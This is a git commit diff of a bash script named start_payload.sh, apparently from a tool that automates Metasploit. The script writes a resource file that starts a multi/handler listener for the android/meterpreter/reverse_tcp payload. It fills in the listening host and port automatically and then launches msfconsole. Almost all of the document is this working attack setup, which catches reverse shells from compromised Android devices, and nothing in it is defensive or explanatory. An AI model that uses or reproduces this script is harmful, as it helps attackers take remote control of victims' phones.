81e87cedb1e1c8be4baccf9b0f62aa08a11f7953
ChooseYourPlan <timweissenfels7@gmail.com>
2019-10-31 01:19:07 +0100

    Converted to lighter version without args for exploit

--- start_payload.sh
+++ start_payload.sh
@@ -1,14 +1,13 @@
 #!/bin/bash
 
 sudo bash -c "touch meterpreter.rc"
-sudo bash -c "echo use exploit/multi/handler >> meterpreter.rc"
-sudo bash -c "echo set PAYLOAD android/meterpreter/reverse_tcp >> meterpreter.rc"
+sudo bash -c "echo use multi/handler >> meterpreter.rc"
+sudo bash -c "echo set payload android/meterpreter/reverse_tcp >> meterpreter.rc"
 
 listen_host=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1  -d'/')
 listen_port=$(cat config_payload.ini | grep Listen_Port | sed -E 's/(.*)={1}(.*)/\2/')
 
 sudo bash -c "echo set LHOST $listen_host >> meterpreter.rc"
 sudo bash -c "echo set LPORT $listen_port >> meterpreter.rc"
-sudo bash -c "echo exploit -j -z >> meterpreter.rc"
-sudo bash -c "cat meterpreter.rc"
-sudo bash -c "msfconsole -r meterpreter.rc"
+sudo bash -c "echo exploit >> meterpreter.rc"
+sudo bash -c "msfconsole -r meterpreter.rc -q"
